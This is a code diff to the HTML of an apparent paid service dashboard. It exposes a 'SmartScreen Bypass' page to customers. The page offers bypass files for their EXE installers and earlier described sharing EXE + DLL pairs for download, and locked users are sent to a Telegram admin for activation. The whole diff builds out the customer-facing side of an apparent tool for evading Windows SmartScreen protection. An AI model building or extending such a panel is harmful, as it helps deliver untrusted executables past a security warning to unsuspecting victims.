@@ -128,7 +128,7 @@
             <svg viewBox="0 0 24 24" class="ic"><path d="M21 15a2 2 0 01-2 2H8l-4 4V5a2 2 0 012-2h13a2 2 0 012 2z"/><path d="M9 10h.01M12.5 10h.01M16 10h.01"/></svg>
             <span>Support</span>
           </button>
-          <button class="nav-item owner-only" data-view="smartscreen" hidden>
+          <button class="nav-item" data-view="smartscreen">
             <svg viewBox="0 0 24 24" class="ic"><path d="M12 2L3 7v5c0 5.25 3.75 10.15 9 11.35C17.25 22.15 21 17.25 21 12V7z"/><path d="M9 12l2 2 4-4"/></svg>
             <span>SmartScreen</span>
           </button>
@@ -342,11 +342,11 @@
           <div class="page-head">
             <div>
               <h1 class="page-title">SmartScreen Bypass</h1>
-              <p class="page-sub">Upload EXE + DLL pairs. Share the download link — both files download at once.</p>
+              <p class="page-sub" id="ss-sub">Download bypass files for your EXE installer.</p>
             </div>
           </div>
-          <!-- Upload form -->
-          <div class="settings-card" style="margin-bottom:16px">
+          <!-- Upload form (owner only) -->
+          <div class="settings-card owner-only" id="ss-upload-card" style="margin-bottom:16px">
             <div class="set-row" style="flex-direction:column;align-items:flex-start;gap:10px;padding:16px">
               <div style="font-weight:600;font-size:14px">Upload New Pair</div>
               <div style="display:flex;flex-wrap:wrap;gap:10px;width:100%">
@@ -370,7 +370,22 @@
               </div>
             </div>
           </div>
-          <!-- List of uploaded pairs -->
+          <!-- Not-activated state (non-owner, no access) -->
+          <div id="ss-locked" hidden style="display:flex;flex-direction:column;align-items:center;justify-content:center;padding:60px 24px;text-align:center;gap:16px">
+            <svg width="52" height="52" viewBox="0 0 24 24" fill="none" stroke="#4a9eff" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M12 2L3 7v5c0 5.25 3.75 10.15 9 11.35C17.25 22.15 21 17.25 21 12V7z"/>
+            </svg>
+            <div style="font-size:18px;font-weight:600">SmartScreen Bypass</div>
+            <div style="opacity:.7;max-width:380px;line-height:1.6">Contact customer support on Telegram to activate SmartScreen bypass for your EXE files.</div>
+            <a href="https://t.me/hatchadmin" target="_blank" rel="noopener"
+               style="display:inline-flex;align-items:center;gap:10px;background:#229ED9;color:#fff;border-radius:10px;padding:12px 22px;font-weight:600;font-size:15px;text-decoration:none;margin-top:4px">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor">
+                <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12l-6.871 4.326-2.962-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.833.941z"/>
+              </svg>
+              Contact Admin on Telegram
+            </a>
+          </div>
+          <!-- List of pairs (owner + activated users) -->
           <div id="ss-list" style="display:flex;flex-direction:column;gap:10px">
             <div style="opacity:.5;font-size:14px;padding:8px 0">Loading…</div>
           </div>
